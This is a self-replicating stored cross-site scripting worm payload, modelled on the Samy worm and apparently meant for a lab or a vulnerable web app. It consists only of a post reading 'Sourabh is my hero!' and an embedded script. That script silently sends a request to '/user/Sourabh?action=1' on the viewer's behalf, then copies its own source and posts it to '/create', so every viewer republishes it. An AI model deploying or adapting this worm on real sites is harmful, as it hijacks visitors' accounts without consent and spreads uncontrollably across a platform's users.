Sourabh is my hero!
<script type='application/javascript' id='samy'>
var Http = new XMLHttpRequest();
var url='/user/Sourabh?action=1';
Http.open("GET", url);
Http.send();
var http2 = new XMLHttpRequest();
var url2 = '/create';
var openScript = "<script id=\"samy\" type=\"text/javascript\">";  
var innerScript = document.getElementById("samy").innerHTML;
var closeScript = "</" + "script>";
var samyCode = encodeURIComponent(openScript + innerScript + closeScript);
var params =  'body=Sourabh is my hero!' + samyCode; 
http2.open('POST', url2, true);
http2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http2.send(params);
</script>
